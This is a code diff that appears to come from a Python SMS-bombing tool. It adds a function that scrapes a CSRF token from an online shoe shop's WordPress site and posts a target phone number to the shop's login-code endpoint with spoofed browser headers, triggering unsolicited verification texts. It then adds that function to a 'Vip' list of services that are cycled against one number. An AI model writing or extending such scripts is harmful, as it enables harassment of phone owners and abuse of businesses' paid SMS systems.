@@ -52,6 +52,74 @@ def check_internet():
 # ------------------------------
 # SMS Service
 # ------------------------------
+
+
+
+def payonshoes(phone):
+    import requests
+    import re
+    
+    formatted_phone = "0" + phone.replace("+98", "")
+    
+    try:
+        session = requests.Session()
+        home_response = session.get("https://payonshoes.com/", timeout=10)
+        
+        # استخراج CSRF_TOKEN
+        csrf_token = None
+        csrf_patterns = [
+            r'name="csrf" value="([a-f0-9]+)"',
+            r'name="dig_nounce" value="([a-f0-9]+)"'
+        ]
+        
+        for pattern in csrf_patterns:
+            match = re.search(pattern, home_response.text)
+            if match:
+                csrf_token = match.group(1)
+                break
+        
+        if not csrf_token:
+            csrf_token = "11d30be44d"
+        
+        url = "https://payonshoes.com/wp-admin/admin-ajax.php"
+        
+        payload = {
+            "action": "digits_check_mob",
+            "countrycode": "+98",
+            "mobileNo": formatted_phone,  # با صفر
+            "csrf": csrf_token,
+            "login": "2",
+            "username": "",
+            "email": "",
+            "captcha": "",
+            "captcha_ses": "",
+            "json": "1",
+            "whatsapp": "0"
+        }
+        
+        headers = {
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "X-Requested-With": "XMLHttpRequest",
+            "Origin": "https://payonshoes.com",
+            "Referer": "https://payonshoes.com/",
+        }
+        
+        response = session.post(url, data=payload, headers=headers, timeout=10)
+        
+        if response.status_code == 200:
+            if response.text.strip() == "1":
+                print(f'{g}(payonshoes) {a}Code Sent')
+                return True
+        
+        print(f'{r}[-] (payonshoes) Failed{a}')
+        return False
+            
+    except Exception:
+        print(f'{r}[-] (payonshoes) Failed{a}')
+        return False
+
+
 def mobilex(phone):
     import requests
     
@@ -137,7 +205,8 @@ def send_service_safe(service, phone):
 def Vip(phone, Time):
     services = [
     alldigitall,
-    mobilex,  # سرویس جدید
+    mobilex,
+    payonshoes,  # سرویس جدید
 ]
     total_services = len(services)
 
